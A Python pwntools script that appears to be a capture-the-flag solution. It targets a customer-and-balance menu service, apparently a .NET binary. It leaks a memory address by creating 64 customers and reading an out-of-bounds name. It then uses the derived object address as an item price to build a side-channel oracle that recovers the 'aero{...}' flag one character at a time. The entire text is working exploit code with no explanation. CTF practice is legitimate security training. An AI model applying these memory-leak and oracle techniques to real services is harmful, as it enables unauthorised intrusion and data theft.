#!/usr/bin/env python3.7

from pwn import *
from string import ascii_lowercase


def create_customer(io):
    io.sendlineafter(b'>>>', b'1')
    line = io.recvline()
    return int(line.replace(b'[+] id = ', b'').decode())


def change_customer_name(io, id, name):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b':', str(id).encode())
    io.sendlineafter(b':', name.encode())


def change_customer_balance(io, id, balance):
    io.sendlineafter(b'>>>', b'3')
    io.sendlineafter(b':', str(id).encode())
    io.sendlineafter(b':', str(balance).encode())


def show_customer_name(io, id):
    io.sendlineafter(b'>>>', b'4')
    io.sendlineafter(b':', str(id).encode())
    io.recvuntil(b'[+] name = ')
    return io.recvuntil(b'\n1. create customer')


def show_customer_balance(io, id):
    io.sendlineafter(b'>>>', b'5')
    io.sendlineafter(b':', str(id).encode())
    line = io.recvline()
    return int(line.replace(b'[+] balance = ', b'').decode())


def buy_an_item(io, id, price):
    io.sendlineafter(b'>>>', b'6')
    io.sendlineafter(b':', str(id).encode())
    io.sendlineafter(b':', str(price).encode())
    line = io.recvline()
    return int(line.replace(b'[+] new balance = ', b'').decode())


def leak_address(io):
    for _ in range(64):
        create_customer(io)
    
    name = show_customer_name(io, 32)
    leak = name[20:30]
    string = leak.decode('utf-8')
    address = ''.join(hex(ord(x))[2:] for x in string[::-1])

    return int(address, 16)


def main(io):
    leak = leak_address(io)
    print('leak', hex(leak))
    base = ((leak >> 12) - 0x7) << 12
    obj = base | 0x4f8
    print('obj', hex(obj))

    id = create_customer(io)
    
    flag = 'aero{'
    alphabet = ascii_lowercase

    for _ in range(128):
        print(flag)
        
        for s in alphabet:
            change_customer_name(io, id, flag + s)
            r = buy_an_item(io, id, obj)

            if r == 1:
                flag += chr(ord(s) - 1)
                break


if __name__ == '__main__':
    # with process('./bin/Release/net5.0/test', env={'DOTNET_ROOT': '/usr/local/dotnet'}) as io:
    with remote('0.0.0.0', 17102) as io:
        main(io)
